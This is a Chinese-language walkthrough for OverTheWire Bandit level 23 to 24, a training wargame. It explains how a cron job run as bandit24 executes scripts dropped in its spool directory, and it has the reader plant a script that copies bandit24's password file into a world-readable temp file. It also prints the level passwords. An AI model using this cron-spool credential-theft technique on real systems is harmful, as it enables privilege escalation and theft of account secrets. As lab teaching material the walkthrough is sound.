# Bandit Level 23 → Level 24 攻略 📜

## 关卡目标 🎯

本关卡的目标是分析一个以bandit24用户身份运行的cron任务，编写一个脚本来获取下一关的密码，并将该脚本放在`/var/spool/bandit24/`目录中执行。

## 所需知识 📚

### Cron定时任务 ⏱️

与前两关类似，我们需要了解cron定时任务的基本概念和配置。

### Shell脚本编写 📝

我们需要编写一个shell脚本来获取密码。

### 文件权限和目录权限 🔒

我们需要确保我们创建的脚本具有正确的权限，以便bandit24用户可以执行它。

### 临时目录和文件 📂

我们需要使用临时目录来存储我们的脚本和输出文件。

## 详细解题步骤 📝

### 1. 登录游戏服务器 🔐

使用上一关获得的密码登录服务器：

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

密码：`jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`

### 2. 查看cron任务 👀

首先，我们需要查看与bandit24相关的cron任务：

```bash
cat /etc/cron.d/cronjob_bandit24
```

输出结果应该类似于：

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

这表明系统会在每次重启时以及每分钟以bandit24用户的身份执行`/usr/bin/cronjob_bandit24.sh`脚本。

### 3. 查看cron脚本 📜

现在我们需要查看`/usr/bin/cronjob_bandit24.sh`脚本的内容：

```bash
cat /usr/bin/cronjob_bandit24.sh
```

输出结果应该类似于：

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

这个脚本做了以下几件事：
1. 使用`whoami`命令获取当前用户名，并将结果存储在`myname`变量中
2. 切换到`/var/spool/$myname`目录（即`/var/spool/bandit24`）
3. 遍历该目录中的所有文件
4. 对于每个文件，检查其所有者是否为bandit23
5. 如果所有者是bandit23，则执行该文件（最多运行60秒）
6. 执行后删除该文件

这意味着我们可以在`/var/spool/bandit24`目录中创建一个脚本，该脚本将以bandit24用户的身份执行，然后我们可以使用该脚本读取bandit24的密码。

### 4. 创建临时目录 📂

首先，我们需要创建一个临时目录来存储我们的脚本和输出文件：

```bash
mkdir -p /tmp/bandit23_to_24
chmod 777 /tmp/bandit23_to_24
```

### 5. 编写脚本 📝

现在我们需要编写一个脚本，该脚本将读取bandit24的密码并将其写入我们的临时目录：

```bash
nano /tmp/bandit23_to_24/get_password.sh
```

在编辑器中输入以下内容：

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit23_to_24/password.txt
chmod 666 /tmp/bandit23_to_24/password.txt
```

保存并退出编辑器（在nano中，按Ctrl+O保存，然后按Ctrl+X退出）。

### 6. 设置脚本权限 🔒

我们需要确保脚本具有执行权限，并且所有者是bandit23：

```bash
chmod 777 /tmp/bandit23_to_24/get_password.sh
```

### 7. 复制脚本到cron目录 📋

现在我们需要将脚本复制到`/var/spool/bandit24`目录，以便它被cron任务执行：

```bash
cp /tmp/bandit23_to_24/get_password.sh /var/spool/bandit24/
```

### 8. 等待脚本执行 ⏱️

cron任务每分钟执行一次，所以我们需要等待一段时间（最多一分钟）让脚本执行：

```bash
sleep 60
```

### 9. 查看密码文件 🔑

现在我们可以查看脚本生成的密码文件：

```bash
cat /tmp/bandit23_to_24/password.txt
```

输出结果应该显示bandit24的密码：

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

## 命令解释 🔍

- `mkdir -p /tmp/bandit23_to_24`：
  - `mkdir`：创建目录
  - `-p`：如果需要，创建父目录
  - `/tmp/bandit23_to_24`：要创建的目录
- `chmod 777 /tmp/bandit23_to_24`：
  - `chmod`：更改文件权限
  - `777`：设置权限为所有用户可读、可写、可执行
  - `/tmp/bandit23_to_24`：目标目录
- `nano /tmp/bandit23_to_24/get_password.sh`：
  - `nano`：文本编辑器
  - `/tmp/bandit23_to_24/get_password.sh`：要编辑的文件
- `cp /tmp/bandit23_to_24/get_password.sh /var/spool/bandit24/`：
  - `cp`：复制文件
  - `/tmp/bandit23_to_24/get_password.sh`：源文件
  - `/var/spool/bandit24/`：目标目录

## 学习要点总结 📌

1. **Shell脚本编写** - 学习了如何编写简单的shell脚本
2. **文件权限设置** - 了解了如何设置文件和目录的权限
3. **Cron任务利用** - 学习了如何利用cron任务执行特权操作
4. **临时文件和目录** - 了解了如何使用临时文件和目录进行数据传递

## 提示 💡

- 在编写脚本时，确保脚本具有正确的权限，以便目标用户可以执行它
- 使用临时目录时，确保设置适当的权限，以便可以读取和写入文件
- 在实际系统中，应该避免设置过于宽松的权限（如777），这可能导致安全风险
- cron任务是自动化系统管理的强大工具，但也可能被滥用，因此应该谨慎配置

## 下一步 ⏭️

使用获得的密码登录到Level 24：

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

密码：`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

## 相关资源 🔗

- [Bash脚本编程指南](./resource/level_24/Bash脚本编程指南.md)
- [Linux文件权限详解](./resource/level_24/Linux文件权限详解.md)
- [Cron定时任务安全最佳实践](./resource/level_24/Cron定时任务安全最佳实践.md)
